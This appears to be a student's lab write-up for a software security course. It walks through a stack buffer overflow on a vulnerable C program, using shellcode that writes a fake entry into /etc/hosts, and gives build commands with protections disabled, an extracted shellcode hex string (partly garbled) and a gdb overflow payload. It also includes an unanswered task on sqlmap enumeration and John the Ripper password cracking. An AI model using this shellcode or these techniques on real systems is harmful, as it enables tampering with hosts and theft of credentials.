# LAB#1, Doan Minh Khanh,   INSE331280E_02FIE

# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in asm. This shellcode add a new entry in hosts file
```
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80            ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20             ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80            ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80            ;syscall to close the file

    push 0x1
    pop eax
    int 0x80            ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  
**Answer 1**: Must conform to below structure:


- Compile asm program and C program to executable code. 
  
Run docker

Copy the above code c into the folder Security-lab/buffer-overflow/vuln.c

Do the same for the shellcode, copy into the file_del

Create the file out vuln.o to execute the code

``` 
gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2  
```
   Create a file_asm out by these 2 commands
``` 
nasm -g -f elf file_del.asm

ld -m elf_i386 -o file_del file_del.o
```
Then I will get the hexstring of file_del
``` 
for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
```
Then I have a ressult
``` 
\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x127.1.1.1\xgoogle\x2e\x63\x6f\x6d\x.com
``` 
The picture of the above actions:
![createpicture](./img/lab1_pic1.png)


- Conduct the attack so that when C executable code runs, shellcode will be triggered and a new entry is  added to the /etc/hosts file on your linux. 
output screenshot (optional)

Stack frame:
![createpicture](./img/test1-stackframe.png)

To execute the the file_del, it needs to overwrite the buffer

find the shellcode address by
``` 
gdb -q vuln.out  
``` 


gcc -g -m32 -fno-stack-protector -z execstack -o vuln.out vuln.c

export mybuf="/home/seed/seclabs/Security-labs/Software/buffer-overflow/file_del"

![createpicture](./img/libc%20(2).png)
```
r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x2a\xdf\xff\xff')")
```
**Conclusion**: comment text about the screenshot or simply answered text for the question
# Task 2: Attack on the database of Vulnerable App from SQLi lab 
- Start docker container from SQLi. 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**: